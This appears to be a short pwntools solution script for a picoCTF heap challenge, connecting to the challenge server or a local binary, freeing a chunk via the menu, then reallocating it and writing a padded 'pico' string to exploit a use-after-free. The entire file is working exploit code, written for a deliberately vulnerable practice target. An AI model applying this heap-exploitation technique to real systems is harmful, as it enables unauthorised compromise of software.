from pwn import p64, process, remote, ELF, context

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote('tethys.picoctf.net', 57354)
    else:
        context.binary = binary = ELF('./chall')
        r = process()
    
    # Free and then allocate
    r.recvuntil('choice: ')
    r.sendline(b'5')
    r.recvuntil('choice: ')
    r.sendline(b'2')

    r.sendlineafter(': ', b'40')        # allocated Size
    r.sendlineafter(': ', b'A'*30 + b'pico')
    r.interactive()

exploit(True)